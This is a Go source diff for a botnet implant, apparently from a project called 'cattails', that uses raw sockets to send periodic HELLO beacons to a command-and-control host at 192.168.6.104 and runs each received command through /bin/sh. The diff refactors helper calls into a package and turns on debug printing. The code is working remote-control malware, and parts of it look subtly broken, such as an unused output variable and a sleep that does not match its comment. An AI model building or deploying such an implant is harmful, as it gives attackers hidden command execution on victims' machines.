@@ -361,15 +361,15 @@ var lastCmdRan string
 // Continuously send HELLO messages so that the C2 can respond with commands
 func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
-		fd := NewSocket()
+		fd := cattails.NewSocket()
 		defer unix.Close(fd)
 
-		packet := CreatePacket(iface, src, dst, 18000, 56969, dstMAC, CreateHello(iface.HardwareAddr, src))
+		packet := cattails.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
 
-		addr := CreateAddrStruct(iface)
+		addr := cattails.CreateAddrStruct(iface)
 
-		SendPacket(fd, iface, addr, packet)
-		// fmt.Println("[+] Sent HELLO")
+		cattails.SendPacket(fd, iface, addr, packet)
+		fmt.Println("[+] Sent HELLO")
 		// Send hello every 5 seconds
 		time.Sleep(50 * time.Second)
 	}
@@ -377,7 +377,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 
 func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 
-	// fmt.Println("[+] Payload Received")
+	fmt.Println("[+] Payload Received")
 
 	// Get command payload and trime newline
 	data := string(packet.ApplicationLayer().Payload())
@@ -385,12 +385,12 @@ func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 
 	// Split into list to get command and args
 	payload := strings.Split(data, " ")
-	// fmt.Println("[+] PAYLOAD:", payload)
+	fmt.Println("[+] PAYLOAD:", payload)
 
 	// Check if target command
 	if target {
 		if payload[1] == hostIP.String() {
-			// fmt.Println("[+] TARGET COMMAND RECEIVED")
+			fmt.Println("[+] TARGET COMMAND RECEIVED")
 			command := strings.Join(payload[2:], " ")
 			execCommand(command)
 		}
@@ -406,7 +406,7 @@ func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 func execCommand(command string) {
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
-		// fmt.Println("[+] COMMAND:", command)
+		fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
 		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
@@ -415,9 +415,9 @@ func execCommand(command string) {
 		}
 		// Save last command we just ran
 		lastCmdRan = command
-		// fmt.Println("[+] OUTPUT:", string(out))
+		fmt.Println("[+] OUTPUT:", string(out))
 	} else {
-		// fmt.Println("[!] Already ran command", command)
+		fmt.Println("[!] Already ran command", command)
 	}
 
 }
@@ -425,24 +425,24 @@ func execCommand(command string) {
 func main() {
 
 	// Create BPF filter vm
-	vm := CreateBPFVM(FilterRaw)
+	vm := cattails.CreateBPFVM(cattails.FilterRaw)
 
 	// Create reading socket
-	readfd := NewSocket()
+	readfd := cattails.NewSocket()
 	defer unix.Close(readfd)
 
-	// fmt.Println("[+] Socket created")
+	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := GetOutwardIface("192.168.6.104:80")
-	// fmt.Println("[+] Using interface:", iface.Name)
+	iface, src := cattails.GetOutwardIface("192.168.6.104:80")
+	fmt.Println("[+] Using interface:", iface.Name)
 
-	dstMAC, err := GetRouterMAC()
+	dstMAC, err := cattails.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
-	// fmt.Println("[+] DST MAC:", dstMAC.String())
-	// fmt.Println("[+] Starting HELLO timer")
+	fmt.Println("[+] DST MAC:", dstMAC.String())
+	fmt.Println("[+] Starting HELLO timer")
 
 	// Start hello timer
 	// Set the below IP to the IP of the C2
@@ -450,9 +450,9 @@ func main() {
 	go sendHello(iface, src, net.IPv4(192, 168, 6, 104), dstMAC)
 
 	// Listen for responses
-	// fmt.Println("[+] Listening")
+	fmt.Println("[+] Listening")
 	for {
-		packet, target := BotReadPacket(readfd, vm)
+		packet, target := cattails.BotReadPacket(readfd, vm)
 		if packet != nil {
 			go botProcessPacket(packet, target, src)
 		}
